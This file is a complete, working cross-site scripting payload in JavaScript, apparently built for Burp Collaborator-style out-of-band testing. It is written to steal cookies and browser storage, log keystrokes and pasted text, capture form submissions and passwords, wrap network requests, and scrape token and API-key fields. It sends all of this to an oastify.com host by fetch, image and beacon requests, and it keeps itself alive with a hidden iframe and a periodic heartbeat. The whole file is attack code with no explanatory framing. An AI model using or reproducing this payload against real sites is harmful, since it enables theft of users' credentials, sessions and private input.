// XSS Payload for i6p8n023c9sgss2ucvwqvugx1o7fv6jv.oastify.com
(function() {
    'use strict';
    
    const collaborator = 'http://gauw9qt2for8m1wvltp1g1r8szyqmhe53.oastify.com';
    
    // Steal cookies and sensitive data
    function stealData() {
        const data = {
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            domain: document.domain,
            url: window.location.href,
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            timestamp: new Date().toISOString(),
            language: navigator.language,
            platform: navigator.platform,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
        };
        
        // Send to collaborator
        fetch(`${collaborator}/collect`, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(data)
        }).catch(() => {
            // Fallback methods
            const img = new Image();
            img.src = `${collaborator}/img?data=${btoa(JSON.stringify(data))}`;
            
            // Additional fallback
            const script = document.createElement('script');
            script.src = `${collaborator}/script?data=${btoa(JSON.stringify(data))}`;
            document.head.appendChild(script);
        });
    }
    
    // Advanced Keylogger
    function installKeylogger() {
        let keystrokes = '';
        
        document.addEventListener('keydown', function(e) {
            keystrokes += e.key;
            
            // Send every 10 keystrokes or on Enter/Tab
            if (keystrokes.length >= 10 || e.key === 'Enter' || e.key === 'Tab') {
                const keyData = {
                    type: 'keystrokes',
                    keys: keystrokes,
                    target: e.target.tagName,
                    id: e.target.id,
                    name: e.target.name,
                    time: new Date().toISOString(),
                    url: window.location.href
                };
                
                sendToCollaborator(keyData);
                keystrokes = '';
            }
        });
        
        // Capture paste events
        document.addEventListener('paste', function(e) {
            const pastedData = {
                type: 'paste',
                data: e.clipboardData.getData('text'),
                target: e.target.tagName,
                time: new Date().toISOString()
            };
            
            sendToCollaborator(pastedData);
        });
    }
    
    // Form Hijacking with Credential Capture
    function hijackForms() {
        document.addEventListener('submit', function(e) {
            const formData = new FormData(e.target);
            const data = Object.fromEntries(formData);
            
            const formPayload = {
                type: 'form_submit',
                action: e.target.action,
                method: e.target.method,
                data: data,
                inputs: Array.from(e.target.elements).map(input => ({
                    name: input.name,
                    type: input.type,
                    value: input.value
                })),
                time: new Date().toISOString()
            };
            
            sendToCollaborator(formPayload);
            
            // Continue with original form submission
            setTimeout(() => {
                e.target.submit();
            }, 500);
        });
        
        // Capture input changes for passwords
        document.querySelectorAll('input[type="password"]').forEach(input => {
            input.addEventListener('change', function(e) {
                const passwordData = {
                    type: 'password_change',
                    name: e.target.name,
                    value: e.target.value,
                    time: new Date().toISOString()
                };
                
                sendToCollaborator(passwordData);
            });
        });
    }
    
    // Network Traffic Monitoring
    function monitorRequests() {
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const requestData = {
                type: 'fetch_request',
                url: args[0],
                method: args[1]?.method || 'GET',
                timestamp: new Date().toISOString()
            };
            
            sendToCollaborator(requestData);
            return originalFetch.apply(this, args);
        };
        
        // Monitor XMLHttpRequest
        const originalXHR = window.XMLHttpRequest;
        window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            
            xhr.open = function(method, url) {
                const xhrData = {
                    type: 'xhr_request',
                    method: method,
                    url: url,
                    timestamp: new Date().toISOString()
                };
                
                sendToCollaborator(xhrData);
                return originalOpen.apply(this, arguments);
            };
            
            return xhr;
        };
    }
    
    // DOM Scraping
    function scrapeSensitiveData() {
        const sensitiveElements = {
            passwords: document.querySelectorAll('input[type="password"]'),
            emails: document.querySelectorAll('input[type="email"]'),
            hidden: document.querySelectorAll('input[type="hidden"]'),
            tokens: document.querySelectorAll('[class*="token"], [id*="token"], [name*="token"]'),
            keys: document.querySelectorAll('[class*="key"], [id*="key"], [name*="key"]'),
            api: document.querySelectorAll('[class*="api"], [id*="api"], [name*="api"]')
        };
        
        const scrapedData = {};
        
        Object.keys(sensitiveElements).forEach(type => {
            scrapedData[type] = Array.from(sensitiveElements[type]).map(el => ({
                tag: el.tagName,
                name: el.name,
                id: el.id,
                class: el.className,
                value: el.value
            }));
        });
        
        if (Object.keys(scrapedData).some(key => scrapedData[key].length > 0)) {
            sendToCollaborator({
                type: 'dom_scraping',
                data: scrapedData,
                timestamp: new Date().toISOString()
            });
        }
    }
    
    // Beacon Function
    function sendToCollaborator(data) {
        const payload = {
            ...data,
            victim: document.domain,
            session: Math.random().toString(36).substring(7)
        };
        
        // Multiple exfiltration methods
        const methods = [
            () => fetch(`${collaborator}/xss`, {method: 'POST', mode: 'no-cors', body: JSON.stringify(payload)}),
            () => { const i = new Image(); i.src = `${collaborator}/img?d=${btoa(JSON.stringify(payload))}`; },
            () => navigator.sendBeacon && navigator.sendBeacon(`${collaborator}/beacon`, JSON.stringify(payload))
        ];
        
        methods.forEach(method => {
            try { method(); } catch(e) {}
        });
    }
    
    // Persistence Mechanisms
    function establishPersistence() {
        // Store in localStorage
        try {
            localStorage.setItem('xss_persist', 'active');
            sessionStorage.setItem('xss_session', 'active');
        } catch(e) {}
        
        // Create hidden iframe
        const iframe = document.createElement('iframe');
        iframe.src = `${collaborator}/ping`;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        // Periodic beacon
        setInterval(() => {
            sendToCollaborator({
                type: 'heartbeat',
                time: new Date().toISOString(),
                url: window.location.href
            });
        }, 30000);
    }
    
    // Control Panel
    function createControlPanel() {
        if (document.getElementById('xss-control-panel')) return;
        
        const panel = document.createElement('div');
        panel.id = 'xss-control-panel';
        panel.innerHTML = `
            <div style="position:fixed;top:20px;right:20px;background:#ff4444;color:white;padding:15px;border-radius:5px;z-index:9999;font-family:Arial,sans-serif;box-shadow:0 0 10px rgba(0,0,0,0.5);">
                <h4 style="margin:0 0 10px 0;">XSS Active - ${collaborator}</h4>
                <button onclick="stealData()" style="background:#333;color:white;border:none;padding:5px;margin:2px;cursor:pointer;">Steal Data</button>
                <button onclick="scrapeSensitiveData()" style="background:#333;color:white;border:none;padding:5px;margin:2px;cursor:pointer;">Scrape DOM</button>
                <button onclick="this.parentElement.parentElement.remove()" style="background:#333;color:white;border:none;padding:5px;margin:2px;cursor:pointer;">Close</button>
            </div>
        `;
        document.body.appendChild(panel);
    }
    
    // Main Initialization
    function init() {
        console.log(`XSS Payload Active - Reporting to ${collaborator}`);
        
        // Execute modules with error handling
        const modules = [stealData, installKeylogger, hijackForms, monitorRequests, scrapeSensitiveData, establishPersistence, createControlPanel];
        
        modules.forEach(module => {
            try { module(); } catch(e) {
                sendToCollaborator({type: 'error', module: module.name, error: e.message});
            }
        });
        
        // Global functions for manual control
        window.stealData = stealData;
        window.scrapeSensitiveData = scrapeSensitiveData;
        window.sendToCollaborator = sendToCollaborator;
    }
    
    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
